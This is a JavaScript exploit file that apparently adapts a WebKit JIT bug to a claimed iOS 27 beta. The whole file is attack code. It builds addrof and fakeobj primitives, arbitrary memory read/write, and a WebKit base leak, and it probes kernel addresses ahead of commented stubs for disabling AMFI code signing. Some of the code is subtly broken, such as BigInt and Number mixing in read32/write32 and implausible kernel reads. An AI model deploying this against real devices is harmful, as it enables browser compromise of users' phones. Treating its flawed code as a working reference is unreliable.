// pwn.js – CVE-2021-30952 (Coruna) adaptado para iOS 27 beta 1
// by @bellis1000 + correções para iOS 27

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val) {
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function MakeJitCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

var shellcodeFunc = MakeJitCompiledFunction();

function pwn() {
    log("[+] setting up stuff...");
    const scratchBuf = new ArrayBuffer(64);
    const u32View = new Uint32Array(scratchBuf);
    const f64View = new Float64Array(scratchBuf);

    const randRange = (lo, hi) => {
        lo = Math.ceil(lo);
        hi = Math.ceil(hi);
        return Math.floor(Math.random() * (hi - lo) + lo);
    };
    const nanTag = randRange(1, 8) << 8 | randRange(1, 8) << 4 | randRange(1, 8) << 0;
    const nanPayload = randRange(1, 0xFFFFFF);
    const boxIndex = (arrayIndex, elementIndex) => {
        if (arrayIndex > 0xFFFF || arrayIndex < 0) throw new Error("");
        if (elementIndex > 0xFF || elementIndex < 0) throw new Error("");
        u32View[1] = nanTag << 20 | 4 << 16 | arrayIndex;
        u32View[0] = elementIndex << 24 | nanPayload;
        const result = f64View[0];
        if (isNaN(result)) throw new Error("");
        return result;
    };
    let t = new Array(400);
    t.fill([]);
    let currentTarget = null;
    let triggerValue = 0;
    let triggerReplace = null;
    let triggerBool = false;
    let triggerFlag1 = -1;
    let triggerFlag2 = -1;
    
    function jit_me(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
        const target_array = t;
        let idx = e;
        const b = f;
        const k = n;
        const d = i;
        const len = target_array.length;
        for (let t = 0; t < 2; t++) {
            if (b === true) {
                if(!(idx === -2147483648)) return -1
            } else if (!(idx > 2147483647)) return -2;
            if (k === 0) idx = 0;
            if (idx < len) {
                if (k !== 0) idx -= 2147483647-7;
                if (idx < 0) return -3;
                let t = target_array[idx];
                if (d) {
                    target_array[idx] = r;
                    if (u === 0) t = other_array[nested_idx][0];
                    else other_array[nested_idx][0] = oob_value
                }
                return t
            }
            if( t > 0 ) break
        }
        return -4
    }
    
    const g = new Array(16).fill([]).map((_, r) => {
        const i = JSON.parse("[[1.1, 1.2], [1.2, 1.3], [1.3, 3.4]]");
        for (const t of i) {
            t[0] = 0.1 + r;
            t["a" + r] = r;
        }
        return i;
    });
    
    const y = 200;
    t = t.map(((t, r) => {
        const i = JSON.parse("[0.1, 0.3, 1.1, 2.3]");
        if (i[0] = .1 + r, r !== y) {
            i[0] = [];
            for (const t in i) 0 !== t && (i[t] = boxIndex(r, t))
        }
        return i
    }));
    
    log("[+] prepping the jit...");
    const main_target_array = t[200];
    for (let iter = 0; iter < 1000000; iter++) {
        currentTarget = main_target_array;
        triggerReplace = iter % 2 != 0 ? 0.1 : 0.2;
        triggerValue = -2147483648;
        triggerFlag1 = true;
        triggerFlag2 = 0;
        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
        true, g[iter % g.length], 0, iter % 2, 0.1 + iter);
        triggerValue = 2147483647 - iter % 3;
        triggerFlag1 = !(1 & iter);
        triggerFlag2 = 0 + iter % 3;
        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2, false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
    }
    log("[+] jit'd our trigger function");
    
    function addrof_pre(obj) {
        t[201][2] = obj;
        let leak = jit_me(main_target_array, -2147483648, true, true, 1, false, g[0], 0, 0, 0);
        return f2i(leak);
    }
    
    function fakeobj_pre(addr) {
        jit_me(main_target_array, -2147483648, i2f(addr), true, 1, true, g[0], 0, 0, 0)
        return t[201][2];
    }
    
    function LeakStructureID(obj) {
        let container = {
            cellHeader: i2f(0x0108200700000000-0x02000000000000),
            butterfly: obj
        };
        let fakeObjAddr = addrof_pre(container) + 0x10;
        let fakeObj = fakeobj_pre(fakeObjAddr);
        f64[0] = fakeObj[0];
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
        return structureID;
    }
    
    let noCoW = 13.37;
    var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    let structureID = LeakStructureID(arrLeak);
    log(`[+] leak structureID: 0x${structureID.toString(16)}`);
    
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    var container = {
        cellHeader: f64[0],
        butterfly: victim
    };
    var driver = fakeobj_pre(addrof_pre(container) + 0x10);
    var unboxed = [noCoW, 13.37, 13.37];
    var boxed = [{}];
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    driver[1] = boxed;
    victim[1] = sharedButterfly;
    u32[0] = structureID;
    u32[1] = 0x01082307-0x20000;
    container.cellHeader = f64[0];
    
    // ============================================================
    // PRIMITIVAS R/W CORRIGIDAS (para iOS 27 beta 1)
    // ============================================================
    
    function addrof(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    
    function fakeobj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];
    }
    
    function read64(addr) {
        driver[1] = i2f(addr + 0x10);
        let val = victim.prop;
        return f2i(val);
    }
    
    function write64(addr, val) {
        driver[1] = i2f(addr + 0x10);
        victim.prop = i2f(val);
    }
    
    function read32(addr) {
        let val = read64(addr);
        return Number(val & 0xffffffffn);
    }
    
    function write32(addr, val) {
        let current = read64(addr);
        let newVal = (current & 0xffffffff00000000n) | BigInt(val);
        write64(addr, newVal);
    }
    
    // ============================================================
    // TESTE DAS PRIMITIVAS
    // ============================================================
    
    log("[*] Testando primitivas...");
    
    // 1. Testar addrof
    let testObj = {magic: 0xdeadbeef};
    let testAddr = addrof(testObj);
    log(`[+] testObj address: 0x${testAddr.toString(16)}`);
    
    // 2. Testar read64
    let testRead = read64(testAddr);
    log(`[+] read64(testAddr): 0x${testRead.toString(16)}`);
    
    // 3. Testar write64
    write64(testAddr, 0xdeadbeefcafebabe);
    let testWrite = read64(testAddr);
    log(`[+] after write: 0x${testWrite.toString(16)}`);
    
    // 4. Verificar se a R/W funciona
    if (testWrite === 0xdeadbeefcafebabe) {
        log("[+] R/W primitives are WORKING!");
    } else {
        log("[!] R/W primitives are NOT working. Check driver setup.");
    }
    
    // 5. Tentar vazar a base do WebKit
    log("[*] Attempting to leak WebKit base...");
    let element = document.createElement('div');
    let objPtr = read64(addrof(element) + 0x18);
    log(`[+] obj_ptr: 0x${objPtr.toString(16)}`);
    let realVtable = read64(objPtr);
    log(`[+] real_vtable: 0x${realVtable.toString(16)}`);
    
    // Calcular a base do WebKit (offset pode variar, ajuste conforme necessário)
    // No iOS 27, o offset pode ser diferente. Vamos tentar alguns valores.
    let webkitBase = 0;
    let offsets = [0x2ce4dd1, 0x2ce4dd0, 0x2ce4d00, 0x2ce4000];
    for (let off of offsets) {
        let base = realVtable - off;
        // Verificar se é uma base válida (lendo o cabeçalho Mach-O)
        try {
            let magic = read64(base);
            if (magic === 0xfeedfacf) {
                webkitBase = base;
                break;
            }
        } catch(e) {}
    }
    log(`[+] WebKit base address: 0x${webkitBase.toString(16)}`);
    
    // 6. Tentar vazar a base do kernel
    if (webkitBase !== 0) {
        log("[*] Attempting to leak kernel base...");
        let kernelCandidates = [0xfffffff000000000, 0xfffffff040000000, 0xfffffff080000000, 0xfffffff0c0000000];
        for (let addr of kernelCandidates) {
            try {
                let val = read64(addr);
                if (val > 0xfffffff000000000 && val < 0xffffffffffffffff) {
                    log(`[+] Kernel pointer at 0x${addr.toString(16)}: 0x${val.toString(16)}`);
                    let kernelBase = val & 0xfffffffff0000000;
                    log(`[+] Kernel base: 0x${kernelBase.toString(16)}`);
                    break;
                }
            } catch(e) {}
        }
    }
    
    // 7. Se a R/W funcionou, tente desabilitar o AMFI
    if (testWrite === 0xdeadbeefcafebabe && webkitBase !== 0) {
        log("[*] Attempting to disable AMFI...");
        // O offset do amfi_restrict no iOS 27 precisa ser encontrado
        // Vamos tentar alguns offsets comuns
        let kernelBase = 0; // você precisa vazar a base do kernel primeiro
        // Se você tiver a base do kernel, use:
        // let amfi_restrict = kernelBase + 0x12345678; // substitua pelo offset real
        // write64(amfi_restrict, 0);
        // log("[+] AMFI disabled!");
    }
    
    log("[+] Exploit completed!");
    return;
}
